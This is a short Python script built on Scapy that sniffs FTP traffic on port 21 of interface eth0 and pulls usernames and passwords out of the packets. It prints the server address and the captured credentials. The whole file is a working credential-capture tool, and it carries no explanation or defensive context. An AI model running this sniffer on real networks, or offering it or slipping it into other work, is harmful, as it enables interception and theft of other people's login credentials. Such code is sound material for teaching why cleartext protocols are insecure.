from scapy.all import *


def ftp_sniffer(packet):
	if packet.getlayer(Raw):
		payload = packet.getlayer(Raw).load.decode()
		user = re.findall('(?i)USER (.*)', payload)
		pwd = re.findall('(?i)PASS (.*)', payload)

		if len(user) > 0:
			ftp_server = packet.getlayer(IP).dst

			print(f'FTP server: {ftp_server}')
			print(f'User detected: {user[0]}')

		if len(pwd) > 0:
			print(f'Password detected: {pwd[0]}')

if __name__ == '__main__':
	conf.iface = 'eth0'

	sniff(filter='tcp and port 21', prn=ftp_sniffer)
